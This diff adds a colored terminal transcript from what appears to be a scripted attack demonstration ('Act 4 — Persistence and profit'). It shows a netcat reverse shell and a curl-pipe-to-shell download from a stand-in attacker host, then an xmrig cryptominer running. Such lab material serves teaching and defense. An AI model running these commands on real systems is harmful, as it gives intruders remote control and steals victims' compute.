@@ -1,0 +1,15 @@
+
+[1m[35m━━━ ACT 4 — Persistence and profit ━━━[0m
+  [2m•[0m needs the C2 listener: scripts/attacker.sh c2  (or pane 2 in make live)
+
+[1m[31mattacker@internet[0m:[34m~[0m$ nohup nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 & echo '[+] reverse shell launched'[0m
+  [+] reverse shell launched
+
+[1m[31mattacker@internet[0m:[34m~[0m$ curl -s http://attacker.example.local:8080/stage.sh | sh[0m
+  [+] miner running from /tmp/.cache/xmrig (pid 30)
+
+[1m[31mattacker@internet[0m:[34m~[0m$ ps -o pid,args | grep -v ' ps '[0m
+  PID   COMMAND
+      1 /usr/local/bin/blog
+     23 [sh]
+     30 /tmp/.cache/xmrig -o stratum+tcp://attacker.example.local:3333 --donate-level 0
